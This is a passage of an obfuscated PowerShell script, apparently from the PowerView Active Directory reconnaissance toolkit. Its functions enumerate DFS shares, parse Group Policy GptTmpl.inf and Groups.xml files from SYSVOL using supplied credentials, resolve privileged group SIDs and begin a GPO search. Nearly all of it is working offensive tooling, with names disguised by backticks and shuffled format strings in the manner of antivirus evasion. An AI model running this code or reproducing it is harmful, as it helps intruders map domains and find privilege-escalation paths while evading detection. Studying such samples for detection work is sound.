                            ${serV`Er`_Na`Me} =   $UA05X3::"u`NI`codE"."GE`TsT`RinG"(${D`Fs_tarGEt`lIS`T`_b`LoB}[${sER`Ve`R`_NamE`_StARt}..${S`ERver_naM`e`_EnD}])

                            ${Shar`E`_nAME_S`iZe_StART} = ${sErvER`_nAmE`_e`Nd} + 1
                            ${sH`A`RE_nAmE_Siz`e`_enD} = ${Sh`AR`E_Na`ME`_siZ`e_sTArt} + 1
                            ${Share_nA`mE_S`I`Ze} =  $2EMQH6::"TOuI`N`T16"(${DfS`_tARg`Et`lIst`_Bl`oB}[${SHA`Re_`NaMe_S`ize_S`Tart}..${Sha`R`E_n`AME`_Size_End}],0)
                            ${Sh`AR`e_NaME_S`Ta`RT} = ${shA`Re_`N`Ame_sizE`_E`ND} + 1
                            ${S`Ha`Re_N`AME_E`ND} = ${SHAR`E_Name`_ST`ArT} + ${SH`Ar`E_name`_SI`Ze} - 1
                            ${sha`RE`_N`Ame} =   ( VArIAblE UA05x3 -vA)::"UN`I`cOde"."GetsT`R`inG"(${DfS_TarG`e`TL`IsT_BL`ob}[${s`H`ARE_`NAME_ST`ART}..${SHArE_`NAme_`eND}])

                            ${T`ArgE`T_Li`St} += "\\$server_name\$share_name"
                            ${T`_oFfsET} = ${S`harE_`NAME_End} + 1
                        }
                    }
                }
                ${OF`FSET} = ${Bl`ob_d`AT`A_`eND} + 1
                ${DFs_PKT_p`RO`PE`R`Ties} = @{
                    ("{1}{0}"-f'ame','N') = ${blo`B_`NAmE}
                    ("{0}{1}"-f'Pref','ix') = ${pREF`ix}
                    ("{1}{2}{0}"-f 'List','Ta','rget') = ${t`ARGet`_L`isT}
                }
                ${objeCt`_l`I`St} += &("{0}{1}{2}"-f'New-Obj','e','ct') -TypeName ("{2}{0}{1}" -f 'SOb','ject','P') -Property ${dfs_`pkt_`pRO`PERtIES}
                ${PrEF`iX} = ${nu`LL}
                ${BL`Ob_N`AME} = ${Nu`LL}
                ${tAr`g`ET`_lIST} = ${nu`LL}
            }

            ${se`RvERS} = @()
            ${oBje`CT_li`st} | &("{2}{1}{0}" -f'Each-Object','r','Fo') {
                if (${_}."TAR`Ge`TLI`sT") {
                    ${_}."taR`gE`T`lisT" | &("{0}{3}{1}{4}{2}" -f'For','h-','ect','Eac','Obj') {
                        ${Ser`VE`RS} += ${_}.("{0}{1}" -f 's','plit').Invoke('\')[2]
                    }
                }
            }

            ${sE`RVers}
        }

        function gET`-D`oM`AINdFssHAReV1 {
            [CmdletBinding()]
            Param(
                [String]
                ${D`OM`Ain},

                [String]
                ${seA`RCh`Ba`SE},

                [String]
                ${S`ERveR},

                [String]
                ${S`EArChs`C`opE} = ("{0}{2}{1}" -f'Sub','ee','tr'),

                [Int]
                ${Re`sultP`Age`S`IzE} = 200,

                [Int]
                ${S`ER`VE`RtiMeL`im`It},

                [Switch]
                ${TOmB`s`T`ONE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CR`e`DenT`iAL} =  (  chilDItEM  VaRiAble:21gV7e  ).vaLUE::"e`MPTy"
            )

            ${dF`SSeAR`Ch`Er} = &("{3}{2}{0}{1}{4}"-f 'c','h','DomainSear','Get-','er') @PSBoundParameters

            if (${d`FSSEArC`hER}) {
                ${df`SsHAR`eS} = @()
                ${d`Fsse`Ar`ChEr}."F`I`LTEr" = ("{3}{0}{6}{2}{4}{1}{5}" -f'bjectC','=fTDfs','a','(&(o','ss','))','l')

                try {
                    ${rESul`Ts} = ${D`FsSEa`RchER}.("{0}{1}{2}" -f'F','indA','ll').Invoke()
                    ${r`e`sUlts} | &("{1}{0}{3}{2}" -f'e','Wh','-Object','re') {${_}} | &("{2}{3}{1}{0}"-f'ject','ach-Ob','Fo','rE') {
                        ${PrOP`eR`TieS} = ${_}."p`ROpERt`Ies"
                        ${r`EM`oTenaMEs} = ${p`RO`P`eRTiES}."rEmoTE`se`RverN`AmE"
                        ${p`kt} = ${PR`O`perTieS}."P`Kt"

                        ${D`FSsh`ARES} += ${R`EmoTe`NAm`Es} | &("{2}{0}{3}{1}"-f'ach-','ject','ForE','Ob') {
                            try {
                                if ( ${_}.("{0}{1}"-f 'Contain','s').Invoke('\') ) {
                                    &("{1}{2}{0}" -f '-Object','N','ew') -TypeName ("{0}{2}{1}"-f 'PSOb','t','jec') -Property @{("{1}{0}" -f 'me','Na')=${pr`op`ert`IES}."N`Ame"[0];("{2}{1}{3}{0}" -f 'ame','Serve','Remote','rN')=${_}.("{1}{0}" -f'lit','sp').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{1}{3}{4}{2}{0}"-f 'e','Write-V','s','erb','o') ('[Get-'+'Doma'+'inD'+'FSS'+'hare] '+'Ge'+'t-Doma'+'in'+'DFSShareV1'+' '+'e'+'rror '+'i'+'n '+'par'+'sin'+'g '+'DFS'+' '+'s'+'har'+'e '+': '+"$_")
                            }
                        }
                    }
                    if (${res`UlTs}) {
                        try { ${rEsu`LtS}.("{2}{0}{1}" -f 'pos','e','dis').Invoke() }
                        catch {
                            &("{3}{2}{0}{1}{4}" -f 'e-V','erbos','t','Wri','e') ('[G'+'et-Do'+'mainDF'+'SShar'+'e] '+'G'+'e'+'t-D'+'om'+'ainDFSShar'+'e'+'V1 '+'err'+'or '+'dispos'+'in'+'g '+'o'+'f '+'the'+' '+'R'+'esults'+' '+'obj'+'ect'+': '+"$_")
                        }
                    }
                    ${D`Fsse`AR`ChER}.("{0}{1}" -f 'd','ispose').Invoke()

                    if (${p`Kt} -and ${p`Kt}[0]) {
                        &("{1}{2}{0}" -f't','Par','se-Pk') ${P`kT}[0] | &("{1}{0}{2}" -f 'o','F','rEach-Object') {
                            
                            
                            
                            if (${_} -ne ("{1}{0}" -f 'ull','n')) {
                                &("{0}{1}{2}"-f 'New','-Obje','ct') -TypeName ("{0}{1}{2}" -f'PS','Ob','ject') -Property @{("{0}{1}" -f 'N','ame')=${PrOPe`Rti`es}."Na`Me"[0];("{3}{4}{0}{2}{1}"-f'r','e','Nam','Rem','oteServe')=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{1}{2}{0}"-f 'rning','Wr','ite-Wa') ('['+'Get-Do'+'ma'+'i'+'nDFSS'+'hare] '+'G'+'et'+'-D'+'omainDF'+'S'+'ShareV1 '+'er'+'ror '+': '+"$_")
                }
                ${DFsSH`A`R`es} | &("{1}{0}{3}{2}"-f'-O','Sort','ct','bje') -Unique -Property ("{2}{3}{1}{0}" -f'rverName','teSe','Re','mo')
            }
        }

        function g`ET-DOMAINDF`SSH`AREV2 {
            [CmdletBinding()]
            Param(
                [String]
                ${domA`In},

                [String]
                ${sEa`RchbA`sE},

                [String]
                ${Ser`V`eR},

                [String]
                ${s`EaRc`hSc`OPe} = ("{1}{0}{2}"-f'ubtr','S','ee'),

                [Int]
                ${resulT`pAG`es`iZE} = 200,

                [Int]
                ${s`ERV`eRt`IMeli`mit},

                [Switch]
                ${T`oM`BstoNE},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${crEde`N`TI`Al} =  (  item  VARiABlE:21gV7E ).valUE::"E`mPty"
            )

            ${d`FSSE`ArC`heR} = &("{2}{1}{0}{3}{4}{5}"-f 'S','main','Get-Do','earch','e','r') @PSBoundParameters

            if (${df`s`S`earCheR}) {
                ${dFs`s`HaRES} = @()
                ${DfSS`EA`Rch`eR}."fil`TER" = ((("{5}{0}{3}{4}{1}{2}" -f 'ss=','-L','inkv2))','m','sDFS','(&(objectCla')))
                ${Nu`LL} = ${D`FsseAR`ch`ER}."pROp`Er`TI`eST`oloAD".("{1}{0}{2}"-f'ddR','A','ange').Invoke((("{1}{0}{3}{2}" -f 'fs-','msd','pathv2','link'),("{3}{5}{4}{0}{2}{1}" -f'etLi','v2','st','ms','S-Targ','DF')))

                try {
                    ${RES`ULTs} = ${D`FSSE`ARcHer}.("{2}{0}{1}"-f 'ind','All','F').Invoke()
                    ${r`ES`Ults} | &("{0}{2}{1}{3}" -f 'Wher','ec','e-Obj','t') {${_}} | &("{2}{0}{1}{4}{3}"-f 'o','rEach-O','F','ct','bje') {
                        ${P`RO`PeR`Ties} = ${_}."prope`R`TI`es"
                        ${Ta`R`g`ET_LiST} = ${p`RO`pERt`IES}.'msdfs-targetlistv2'[0]
                        ${x`Ml} = [xml]  $ua05X3::"UnI`cODE"."GE`TS`T`RiNG"(${tA`Rg`Et_lIst}[2..(${TarG`Et_`List}."LeNG`Th"-1)])
                        ${d`Fs`shAreS} += ${X`Ml}."TA`Rg`Ets"."cH`i`ldNoDes" | &("{1}{2}{4}{3}{0}" -f 'ect','For','Each','Obj','-') {
                            try {
                                ${t`ArgeT} = ${_}."i`Nn`ERteXT"
                                if ( ${t`A`RgeT}.("{0}{1}{2}"-f 'Cont','ain','s').Invoke('\') ) {
                                    ${dFs`R`oOT} = ${T`ARGeT}.("{0}{1}" -f's','plit').Invoke('\')[3]
                                    ${s`hAre`NaMe} = ${P`Rope`RtiES}.'msdfs-linkpathv2'[0]
                                    &("{1}{2}{0}" -f'ject','New-','Ob') -TypeName ("{0}{1}"-f 'PSOb','ject') -Property @{("{0}{1}"-f 'Na','me')="$DFSroot$ShareName";("{0}{3}{1}{2}{4}"-f 'R','teServ','e','emo','rName')=${t`ARGet}.("{0}{1}" -f 'spli','t').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{3}{1}{0}{2}"-f 'e','e-V','rbose','Writ') ('[Get'+'-'+'Domai'+'nDFS'+'Sh'+'are] '+'G'+'e'+'t'+'-Do'+'mainDFSShareV2 '+'er'+'ror '+'i'+'n '+'pars'+'ing'+' '+'ta'+'rget '+': '+"$_")
                            }
                        }
                    }
                    if (${R`eSUL`Ts}) {
                        try { ${reSu`L`TS}.("{1}{0}"-f 'pose','dis').Invoke() }
                        catch {
                            &("{3}{4}{0}{1}{2}"-f'Verb','o','se','Write','-') ('[Get-DomainDF'+'SS'+'hare]'+' '+'Err'+'or '+'dis'+'posin'+'g '+'of'+' '+'the'+' '+'Re'+'sults '+'o'+'bje'+'ct: '+"$_")
                        }
                    }
                    ${DfSsE`A`RC`her}.("{1}{0}{2}" -f's','di','pose').Invoke()
                }
                catch {
                    &("{2}{0}{1}{3}"-f'Wa','rni','Write-','ng') ('[Ge'+'t'+'-DomainDF'+'SSh'+'are] '+'Get-Domain'+'D'+'F'+'SS'+'hareV'+'2 '+'e'+'rror'+' '+': '+"$_")
                }
                ${dfss`haR`ES} | &("{0}{1}{2}{3}"-f 'So','rt','-Ob','ject') -Unique -Property ("{4}{3}{0}{1}{2}" -f 'Serv','er','Name','ote','Rem')
            }
        }
    }

    PROCESS {
        ${df`SSHAr`ES} = @()

        if (${PSB`OUNd`pARa`MEtERS}[("{0}{1}"-f'Doma','in')]) {
            ForEach (${tA`RgETdoMA`IN} in ${DoMA`IN}) {
                ${se`A`Rc`Her`A`RguMeNTs}[("{0}{1}" -f'Dom','ain')] = ${Ta`Rg`ETDOMAin}
                if (${ve`R`sion} -match (('allq7D1') -REplace ([CHAr]113+[CHAr]55+[CHAr]68),[CHAr]124)) {
                    ${DFSs`Har`ES} += &("{2}{4}{0}{3}{1}" -f 'ainDFSSh','reV1','Get-Do','a','m') @SearcherArguments
                }
                if (${v`ERsiON} -match ((("{1}{0}{2}" -f'{','all','0}2')) -f [CHAr]124)) {
                    ${Df`S`sH`ARES} += &("{3}{0}{2}{1}"-f'ainDFSS','reV2','ha','Get-Dom') @SearcherArguments
                }
            }
        }
        else {
            if (${VerSI`ON} -match ((("{1}{0}"-f'1','allRFX'))."R`ePlAcE"('RFX',[sTRing][ChAR]124))) {
                ${DfssHA`R`Es} += &("{5}{2}{1}{6}{3}{4}{0}" -f 'hareV1','a','t-Dom','F','SS','Ge','inD') @SearcherArguments
            }
            if (${VE`Rs`ION} -match ((("{1}{2}{0}" -f '2','alliZ','H'))."R`eP`LAcE"(([cHaR]105+[cHaR]90+[cHaR]72),'|'))) {
                ${dFsSha`R`ES} += &("{3}{1}{2}{0}" -f'eV2','in','DFSShar','Get-Doma') @SearcherArguments
            }
        }

        ${DFSs`haR`eS} | &("{0}{2}{1}"-f 'Sort','ject','-Ob') -Property (("{2}{1}{3}{0}{4}" -f 'a','teServ','Remo','erN','me'),("{1}{0}"-f 'me','Na')) -Unique
    }
}








function g`ET`-GpTt`MpL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{4}{3}" -f 'ul','d','PSSho','s','Proces'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(MANDAtORy = ${tr`UE}, ValUEFroMPIpeLinE = ${TR`UE}, valUefromPIpeLINebYPrOpErtyNaME = ${TR`UE})]
        [Alias({"{1}{0}{3}{2}"-f 'filesysp','gpc','h','at'}, {"{1}{0}"-f'ath','P'})]
        [String]
        ${gP`TTMP`LPaTH},

        [Switch]
        ${oU`TPUT`ObJ`ect},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EDEnt`I`AL} =  $21Gv7e::"Em`Pty"
    )

    BEGIN {
        ${MaPp`eDPAt`HS} = @{}
    }

    PROCESS {
        try {
            if ((${GP`T`Tm`plPaTh} -Match ((("{1}{2}{0}{3}{4}" -f 'FTUFT.','UFTUFT','U','*UFTUFT.','*'))."RePL`A`ce"('UFT',[string][cHAR]92))) -and (${PSBOu`NDPaR`AMETE`RS}[("{1}{2}{0}" -f 'edential','C','r')])) {
                ${S`YSVol`p`ATh} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not ${m`Ap`PEDpa`THs}[${SYsv`o`l`PAth}]) {
                    
                    &("{1}{2}{3}{4}{0}" -f 'tion','Add-Remot','e','Conne','c') -Path ${sYS`Vo`lPa`TH} -Credential ${C`R`edEnTial}
                    ${mAPPedP`A`Ths}[${s`Y`sVOlPA`Th}] = ${tr`UE}
                }
            }

            ${TaRG`Et`G`PtTM`pl`PAtH} = ${GPtTM`PlPa`TH}
            if (-not ${T`Ar`getG`ptTmp`Lp`ATh}.("{1}{0}" -f 'ndsWith','E').Invoke(("{1}{0}"-f 'f','.in'))) {
                ${TAR`gEtgpT`Tm`P`lpA`TH} += ((("{6}{7}{1}{5}{0}{3}{2}{4}{9}{10}{8}{11}{12}"-f '0','}MAC','ft{0}Wind','}Microso','ows ','HINE{','{','0','ec','N','T{0}S','Edit{','0}GptTmpl.inf'))-F [cHAR]92)
            }

            &("{0}{1}{2}{3}" -f 'W','rite-Ver','bo','se') ('[Get'+'-Gp'+'tTmp'+'l] '+'P'+'ars'+'ing '+'GptT'+'mp'+'l'+'P'+'ath: '+"$TargetGptTmplPath")

            if (${PS`Bo`UnDpaRA`m`ETe`RS}[("{2}{1}{3}{0}"-f 'ct','tputObj','Ou','e')]) {
                ${c`Ont`eNTS} = &("{3}{1}{2}{0}"-f'tent','t-IniC','on','Ge') -Path ${tARGetgP`TTmPlp`A`TH} -OutputObject -ErrorAction ("{0}{1}"-f'Sto','p')
                if (${cOnt`e`Nts}) {
                    ${C`ONt`EN`Ts} | &("{2}{1}{0}"-f 'er','emb','Add-M') ("{1}{2}{0}"-f'perty','Note','pro') ("{1}{0}" -f'ath','P') ${TaRGeT`gPt`TmPL`P`AtH}
                    ${Co`Nt`E`NTS}
                }
            }
            else {
                ${coN`TENtS} = &("{1}{3}{2}{0}{4}"-f 'e','Get-Ini','ont','C','nt') -Path ${Ta`Rg`Et`gPttMP`LpAtH} -ErrorAction ("{0}{1}"-f 'S','top')
                if (${c`OnTeNTS}) {
                    ${con`TEn`Ts}[("{0}{1}"-f 'Pat','h')] = ${targEtg`PT`Tmpl`PaTh}
                    ${C`ONT`eNtS}
                }
            }
        }
        catch {
            &("{2}{1}{0}{3}" -f'o','e-Verb','Writ','se') ('['+'Get'+'-'+'GptTmpl]'+' '+'Er'+'ro'+'r '+'p'+'arsi'+'ng '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        
        ${mApPE`d`p`ATHS}."KE`YS" | &("{1}{0}{2}{3}" -f'or','F','Each-Obj','ect') { &("{4}{5}{3}{0}{2}{1}"-f't','n','io','teConnec','Remove-Re','mo') -Path ${_} }
    }
}


function Ge`T`-grOupSxML {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{3}{2}{1}"-f 'SS','s','roces','houldP','P'}, '')]
    [OutputType({"{4}{2}{0}{1}{3}{5}"-f 'rView.G','ro','we','upsXM','Po','L'})]
    [CmdletBinding()]
    Param (
        [Parameter(MANdaTOry = ${tr`UE}, valueFRoMPIpElIne = ${Tr`Ue}, ValuefRoMpiPelINebyPROPErtYnaME = ${T`Rue})]
        [Alias({"{0}{1}" -f'Pa','th'})]
        [String]
        ${g`Ro`UpSx`m`lPATH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`EN`TiAl} =  $21GV7E::"Emp`TY"
    )

    BEGIN {
        ${MAP`Pe`dpATHS} = @{}
    }

    PROCESS {
        try {
            if ((${GrO`UpsXmL`P`ATH} -Match ((("{0}{2}{1}{3}" -f 'tZMtZMtZ','ZM.*tZM','Mt','tZM.*')).("{1}{2}{0}"-f 'Ce','re','pLA').Invoke('tZM','\'))) -and (${Psbo`U`N`d`P`AraMeTErS}[("{1}{0}{2}" -f 'ed','Cr','ential')])) {
                ${sYsv`O`lPATH} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not ${m`A`PPEdpat`hS}[${sy`s`Vol`PAth}]) {
                    
                    &("{1}{0}{2}{6}{4}{3}{5}" -f'd-Remote','Ad','C','ti','nec','on','on') -Path ${SYSv`OL`p`AtH} -Credential ${cre`D`EntIal}
                    ${mA`ppEd`p`AtHS}[${sYsvolP`A`Th}] = ${T`RuE}
                }
            }

            [XML]${groUPSX`M`LCON`T`eNt} = &("{1}{0}{3}{2}" -f 'o','Get-C','t','nten') -Path ${GRoUpsx`m`Lp`A`Th} -ErrorAction ("{1}{0}"-f 'op','St')

            
            ${GroU`PSX`MlcO`NTenT} | &("{0}{2}{1}" -f 'Sel','Xml','ect-') ("{1}{0}{2}{3}"-f'r','/G','o','ups/Group') | &("{1}{2}{3}{0}" -f 'Object','Sel','e','ct-') -ExpandProperty ("{0}{1}"-f 'nod','e') | &("{0}{2}{1}"-f 'ForEach-','ct','Obje') {

                ${G`ROup`NAME} = ${_}."Pr`OPer`TIeS"."Gr`O`UP`NAmE"

                
                ${gR`OUpSID} = ${_}."proP`erTi`eS"."gr`O`UPSId"
                if (-not ${G`RoU`psiD}) {
                    if (${gro`U`pN`AME} -match ("{2}{1}{3}{4}{0}"-f 'ators','d','A','min','istr')) {
                        ${Gr`oU`PSid} = ("{3}{2}{1}{0}" -f '2-544','3','-','S-1-5')
                    }
                    elseif (${G`ROu`PnAme} -match ("{1}{0}{4}{2}{3}" -f'ote D','Rem','kt','op','es')) {
                        ${Gro`UP`SId} = ("{0}{2}{1}" -f 'S-','5-32-555','1-')
                    }
                    elseif (${G`RO`UpnaME} -match ("{2}{1}{0}"-f 'ts','ues','G')) {
                        ${G`Rou`p`SID} = ("{0}{1}{3}{2}"-f 'S-1-5','-32-5','6','4')
                    }
                    else {
                        if (${P`sBOuNDP`Ar`A`mET`ErS}[("{2}{0}{1}" -f 'reden','tial','C')]) {
                            ${g`ROUP`sId} = &("{0}{1}{4}{3}{2}" -f 'C','o','tTo-SID','r','nve') -ObjectName ${gR`oup`NaME} -Credential ${CRe`DEn`Ti`AL}
                        }
                        else {
                            ${Gr`Oup`sID} = &("{1}{0}{2}"-f'o','C','nvertTo-SID') -ObjectName ${grOu`p`NAMe}
                        }
                    }
                }

                
                ${MeM`BeRS} = ${_}."pR`OPErT`ies"."MEmbe`RS" | &("{0}{1}{4}{2}{3}" -f'Se','le','j','ect','ct-Ob') -ExpandProperty ("{2}{0}{1}" -f'b','er','Mem') | &("{1}{0}{2}" -f'je','Where-Ob','ct') { ${_}."aCT`iOn" -match 'ADD' } | &("{2}{0}{1}{4}{3}"-f'ach-','Ob','ForE','ct','je') {
                    if (${_}."s`iD") { ${_}."S`ID" }
                    else { ${_}."n`AME" }
                }

                if (${MemBE`Rs}) {
                    
                    if (${_}."Fil`TeRS") {
                        ${f`i`LTErs} = ${_}."FIlTe`RS".("{3}{1}{2}{0}"-f 'merator','n','u','GetE').Invoke() | &("{3}{2}{1}{0}"-f'h-Object','ac','E','For') {
                            &("{2}{0}{1}{3}"-f'Obj','e','New-','ct') -TypeName ("{0}{2}{1}" -f'PS','ct','Obje') -Property @{("{0}{1}"-f'Ty','pe') = ${_}."Lo`cALnAme";("{0}{1}" -f 'Val','ue') = ${_}."nA`mE"}
                        }
                    }
                    else {
                        ${FiL`T`ERs} = ${Nu`LL}
                    }

                    if (${Me`mB`erS} -isnot [System.Array]) { ${Me`Mb`Ers} = @(${mE`MB`Ers}) }

                    ${gro`U`pSxMl} = &("{2}{0}{3}{1}"-f'w-Ob','ct','Ne','je') ("{0}{2}{1}" -f 'PSObj','ct','e')
                    ${grou`p`sX`Ml} | &("{1}{0}{2}"-f'mb','Add-Me','er') ("{0}{2}{1}" -f'Note','y','propert') ("{1}{2}{0}" -f 'Path','GP','O') ${TA`RGETG`RoUpS`XMlPa`TH}
                    ${gR`O`UPSXmL} | &("{2}{3}{0}{1}" -f'mb','er','Add-M','e') ("{0}{3}{2}{1}"-f 'No','operty','r','tep') ("{2}{0}{1}" -f'lter','s','Fi') ${f`ilt`ers}
                    ${Gr`ouPs`xmL} | &("{1}{0}{2}" -f 'd-M','Ad','ember') ("{1}{0}{2}{3}" -f 'p','Note','rope','rty') ("{1}{3}{0}{2}" -f 'Nam','Gro','e','up') ${GROu`PnA`ME}
                    ${G`Rou`PsxML} | &("{1}{0}{2}"-f'Mem','Add-','ber') ("{1}{3}{2}{0}" -f'ty','Note','er','prop') ("{0}{1}" -f'G','roupSID') ${G`RouPs`iD}
                    ${gR`oups`XML} | &("{0}{1}{2}"-f 'A','dd-Mem','ber') ("{2}{1}{0}"-f'roperty','ep','Not') ("{1}{0}{2}{3}" -f'upMemb','Gro','er','Of') ${nU`LL}
                    ${gR`oup`SXmL} | &("{0}{2}{3}{1}" -f 'Add-','r','M','embe') ("{2}{0}{1}{3}"-f'ep','ropert','Not','y') ("{0}{2}{3}{1}"-f 'G','s','ro','upMember') ${M`EMbe`Rs}
                    ${gRO`Ups`x`Ml}."PsoB`jE`cT"."T`Y`PenaMes".("{1}{0}" -f 'nsert','I').Invoke(0, ("{2}{0}{4}{3}{1}" -f'View.','L','Power','XM','Groups'))
                    ${GrOuP`sX`Ml}
                }
            }
        }
        catch {
            &("{1}{2}{3}{0}" -f'ose','Wr','ite-Ve','rb') ('[Get-G'+'rou'+'psX'+'ML] '+'Err'+'or '+'p'+'arsing'+' '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        
        ${mapp`E`D`paThS}."k`eyS" | &("{0}{3}{2}{1}"-f'F','bject','O','orEach-') { &("{1}{4}{2}{5}{3}{6}{0}" -f'ion','R','e','teCon','emov','-Remo','nect') -Path ${_} }
    }
}


function gE`T-doMAInG`pO {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}"-f'dP','l','PSShou','rocess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{6}{9}{5}{1}{8}{7}{0}{3}{4}"-f 'oreThanAssig','e','P','nm','ents','eclar','S','arsM','dV','UseD'}, '')]
    [OutputType({"{4}{2}{3}{0}{1}"-f'G','PO','werView','.','Po'})]
    [OutputType({"{2}{4}{0}{3}{1}" -f 'w.GPO.R','w','Pow','a','erVie'})]
    [CmdletBinding(dEFAulTPaRAmETeRSETnaMe = {"{1}{0}" -f'ne','No'})]
    Param(
        [Parameter(pOsitIOn = 0, ValUefRompIPeLIne = ${t`RuE}, VaLuEFROMpipelInebyPrOpertYnaMe = ${T`RUE})]
        [Alias({"{3}{2}{1}{0}{4}" -f'nguis','i','ist','D','hedName'}, {"{3}{2}{1}{0}" -f 'tName','oun','c','SamAc'}, {"{1}{0}" -f 'ame','N'})]
        [String[]]
        ${I`denT`ItY},

        [Parameter(PAraMEterseTNAME = "CoMpU`T`ERi`DeNtIty")]
        [Alias({"{0}{1}{2}"-f 'Comp','uterN','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${c`o`MPUTErI`D`EnTItY},

        [Parameter(ParAMEterseTnAme = "uSErI`D`eNt`ITy")]
        [Alias({"{1}{2}{0}" -f 'me','Us','erNa'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${U`S`ERiDEntiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`Om`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'lter','Fi'})]
        [String]
        ${LD`A`pFI`lTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`o`pERtiES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'h','DSPat','A'})]
        [String]
        ${se`ArCHba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{5}{3}{2}{4}{0}"-f 'er','Do','ol','inContr','l','ma'})]
        [String]
        ${Ser`VeR},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{1}{2}{0}" -f'el','One','Lev'}, {"{2}{1}{0}"-f'ee','r','Subt'})]
        [String]
        ${sEA`RchS`coPE} = ("{2}{1}{0}"-f 'e','re','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`UL`Tp`AgEsIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVer`T`im`elI`mIT},

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{0}{1}" -f'Gro','up'}, {"{1}{0}" -f 'one','N'}, {"{1}{0}" -f 'ner','Ow'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${Se`cu`RI`TYMA`sKs},

        [Switch]
        ${toMbsT`O`NE},

        [Alias({"{2}{1}{0}" -f'turnOne','e','R'})]
        [Switch]
        ${FIn`dOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`dEntIAL} =   ( gET-childITEm vARiaBlE:21gV7e  ).VAlUE::"eM`Pty",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${s`eArCHeR`ARGUMEN`TS} = @{}
        if (${pSb`OUNdpAR`AmEtE`Rs}[("{0}{1}" -f 'Do','main')]) { ${searC`HER`AR`g`UmeN`Ts}[("{0}{2}{1}" -f 'Do','n','mai')] = ${d`oma`in} }
        if (${PSB`Oun`D`paRa`meTerS}[("{0}{2}{1}"-f 'Prop','ies','ert')]) { ${Se`AR`CHERa`RGumeN`Ts}[("{3}{2}{0}{1}"-f 'p','erties','ro','P')] = ${P`RoP`e`RTIes} }
        if (${pS`BOuNDp`Ar`AM`eTerS}[("{1}{2}{0}{3}"-f 'ar','S','e','chBase')]) { ${SEarCHer`A`Rg`UMeNTS}[("{1}{2}{0}" -f'se','Se','archBa')] = ${Sea`Rc`hBaSe} }
        if (${PSbO`UnD`PaRAmE`TERS}[("{1}{0}"-f 'r','Serve')]) { ${SeaRc`He`RAR`gUMe`Nts}[("{0}{1}" -f 'Serv','er')] = ${S`ERVER} }
        if (${p`SB`ound`P`Aram`ETeRS}[("{2}{0}{1}"-f 'rchS','cope','Sea')]) { ${seAr`cHE`RAR`GuMentS}[("{0}{1}{2}" -f'Sear','chScop','e')] = ${sEA`RcHs`Co`pe} }
        if (${Ps`BOUNdP`Ar`AMe`T`ers}[("{2}{1}{3}{0}"-f 'ize','ge','ResultPa','S')]) { ${sEAr`C`HErargUM`eN`Ts}[("{3}{0}{1}{2}"-f 'ultPa','geSiz','e','Res')] = ${RESu`LT`PAge`s`Ize} }
        if (${Ps`BOundpA`R`AmeterS}[("{1}{2}{4}{3}{0}" -f'mit','ServerT','i','i','meL')]) { ${sEA`RchER`Ar`GUmE`NtS}[("{0}{1}{2}{3}" -f'Serv','erTi','meLim','it')] = ${SeRVeR`TIm`ELIMit} }
        if (${ps`Bo`UNDPaR`AMET`ERS}[("{0}{1}{3}{2}"-f'Secu','r','ks','ityMas')]) { ${searC`HeR`Ar`GU`Me`Nts}[("{2}{1}{3}{0}"-f'sks','rity','Secu','Ma')] = ${S`ECURiT`Y`ma`SKs} }
        if (${PsBo`U`NdP`ArAM`eTerS}[("{0}{2}{1}" -f 'Tombsto','e','n')]) { ${sEARche`R`AR`GuME`NTS}[("{1}{2}{0}" -f 'one','Tom','bst')] = ${to`mBSt`O`Ne} }
        if (${psBou`N`dPaRame`T`E`Rs}[("{1}{0}{2}"-f't','Creden','ial')]) { ${se`Ar`cHerAR`gumE`NtS}[("{2}{3}{1}{0}" -f 'al','nti','Cr','ede')] = ${CrEdEn`T`I`Al} }
        ${GPOSE`A`RCh`Er} = &("{5}{3}{1}{4}{0}{2}"-f 'h','S','er','n','earc','Get-Domai') @SearcherArguments
    }

    PROCESS {
        if (${gPoS`E`Ar`cHeR}) {
            if (${psBOun`D`pARa`meTe`Rs}[("{4}{1}{3}{2}{0}"-f'ity','mpu','erIdent','t','Co')] -or ${PSboUnDPA`R`AM`e`Te`Rs}[("{2}{0}{1}"-f'serId','entity','U')]) {
                ${gp`oadS`Pat`Hs} = @()
                if (${se`AR`cH`ERArGUMENtS}[("{2}{0}{1}" -f'rt','ies','Prope')]) {
                    ${O`lDpRO`p`er`TiES} = ${S`EaRc`her`AR`Gu`meNts}[("{2}{0}{1}{3}" -f 'ro','pe','P','rties')]
                }
